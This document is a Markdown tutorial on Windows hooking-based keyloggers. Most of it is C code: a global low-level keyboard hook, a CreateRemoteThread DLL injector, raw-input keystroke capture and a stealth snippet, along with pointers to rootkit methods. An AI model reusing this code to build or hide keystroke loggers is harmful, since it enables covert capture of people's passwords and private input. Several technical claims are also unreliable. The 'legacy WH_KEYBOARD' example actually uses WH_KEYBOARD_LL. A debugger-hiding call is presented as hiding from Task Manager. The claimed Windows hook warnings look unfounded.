# Hooking-Based Keyloggers

Hooking-based keyloggers intercept keyboard input at the OS level by injecting code into the message processing chain. 

## Core Concepts

### 1. Windows Message Processing
Windows uses a message queue system where:
- Keyboard events generate `WM_KEYDOWN`/`WM_KEYUP` messages
- Messages flow: Hardware → Kernel → User-space applications

### 2. Hooking Methods

#### a. WH_KEYBOARD Hook (Legacy)
```c
HHOOK g_hHook = NULL;   // HHOOK is a handle (pointer-like) to a hook instance in Windows.

// KeyboardProc is a callback function, meaning Windows will call it automatically whenever a keyboard event happens.
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) { // Ensures the hook procedure processes only valid hook events.
        if (wParam == WM_KEYDOWN) {

            KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;  
            // This structure contains detailed information about the keyboard event, such as the key code, scan code, flags, etc.

            // typedef struct {
            //   DWORD     vkCode;      // Virtual key code
            //   DWORD     scanCode;    // Hardware scan code
            //   DWORD     flags;       // Extended key, injected, etc.
            //   DWORD     time;        // Timestamp
            //   ULONG_PTR dwExtraInfo; // Additional info
            // } KBDLLHOOKSTRUCT;

            printf("Key: 0x%X\n", pKey->vkCode);  
        }
    }
    return CallNextHookEx(g_hHook, nCode, wParam, lParam); // Returning the value from CallNextHookEx is important for proper hook behavior.
}

// SetHook() calls SetWindowsHookEx, registers your KeyboardProc function as a low-level keyboard hook.
// This tells Windows: When any keyboard event occurs, run KeyboardProc.
void SetHook() {
    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    // WH_KEYBOARD_LL: Hook type — low-level keyboard hook that works globally across all threads.
    // KeyboardProc: Pointer to the callback function handling key events.
    // NULL: Module handle for the DLL containing the hook procedure.
    // NULL means the hook procedure is in the current process (must be the case for WH_KEYBOARD_LL).
    // 0: Thread ID — zero means hook is for all threads globally.
    // The function returns a hook handle stored in g_hHook.
    // If it returns NULL, hook installation failed (you should check and handle errors).
}
```


#### Current Windows Restrictions (as of 2023)

- Secure Desktop:

   Low-level hooks blocked on login/password screens

- UI Automation:

   Requires SetProcessDpiAwarenessContext for proper functioning

- User Consent:

   Windows 10+ shows warning indicators for global hooks



---


#### b. WH_KEYBOARD_LL (Low-Level, Modern)
- Works across processes
- Doesn't require DLL injection
- Sample:
```c
HHOOK g_hHook = NULL;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN) {
            // Your logging logic here
        }
    }
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}
```

## Advanced Techniques

### 1. DLL Injection for System-Wide Hooking
```c
// In DLL:
__declspec(dllexport) LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // Keylogging logic
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// In injector:
void InjectDLL(DWORD pid, const char* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    LPVOID pDllPath = VirtualAllocEx(hProcess, NULL, strlen(dllPath)+1, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(hProcess, pDllPath, dllPath, strlen(dllPath)+1, NULL);
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("kernel32"), "LoadLibraryA"), 
        pDllPath, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
}
```

### 2. Direct Input Capture
```c
// Using Raw Input API
RAWINPUTDEVICE rid;
rid.usUsagePage = 0x01; // Generic Desktop
rid.usUsage = 0x06;     // Keyboard
rid.dwFlags = RIDEV_INPUTSINK;
rid.hwndTarget = hWnd;
RegisterRawInputDevices(&rid, 1, sizeof(rid));

// Window procedure
case WM_INPUT: {
    UINT size;
    GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &size, sizeof(RAWINPUTHEADER));
    LPBYTE lpb = malloc(size);
    GetRawInputData((HRAWINPUT)lParam, RID_INPUT, lpb, &size, sizeof(RAWINPUTHEADER));
    RAWINPUT* raw = (RAWINPUT*)lpb;
    if (raw->header.dwType == RIM_TYPEKEYBOARD) {
        // Process keyboard event
    }
    free(lpb);
}
```

## Stealth Considerations

1. **Rootkit Techniques**:
   - DKOM (Direct Kernel Object Manipulation)
   - SSDT Hooking (Kernel-mode)

2. **Anti-Detection**:
```c
// Hide from Task Manager
typedef NTSTATUS(NTAPI* pNtSetInformationThread)(HANDLE, ULONG, PVOID, ULONG);
pNtSetInformationThread NtSIT = (pNtSetInformationThread)GetProcAddress(GetModuleHandle("ntdll"), "NtSetInformationThread");
if (NtSIT) {
    ULONG hide = 1;
    NtSIT(GetCurrentThread(), 0x11 /*ThreadHideFromDebugger*/, &hide, sizeof(hide));
}
```

## Modern Defenses

1. **PatchGuard** (x64 systems):
   - Blocks kernel hooking
   - Requires signed drivers

2. **Secure Input**:
   - Windows 10+ protected processes
   - Credential UI isolation


